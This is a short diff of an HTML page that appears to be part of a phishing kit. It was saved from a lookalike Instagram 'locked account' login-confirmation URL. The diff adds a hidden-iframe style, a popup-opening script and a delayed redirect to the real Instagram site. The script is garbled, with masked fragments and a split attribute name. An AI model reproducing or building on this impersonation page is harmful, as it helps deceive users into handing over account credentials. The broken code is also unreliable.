@@ -1,7 +1,20 @@
 <!DOCTYPE html>
 <!-- saved from url=(0075)https://ww.w-instagrams.com/accounts/help/security/locked/login/confirm.php -->
 <html lang="tr" class="js not-logged-in client-root"><!--<![endif]--><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<!--iframe{display:none;}--></style>
 
+
+<base target="_self">
+<script language="*************
+<!--
+function PopIt(filename, h, w){
+popup = window.open(filename,"popDialog","height="+h+",wid th="+w+",scrollbars=no")
+if ( popup.********.close() ) {
+popup.********.close()
+}
+}
+// -->
+</script>
         <meta http-equiv="X-UA-Compatible" content="IE=edge">
 
 <meta http-equiv="refresh" content="10;URL=https://instagram.com">
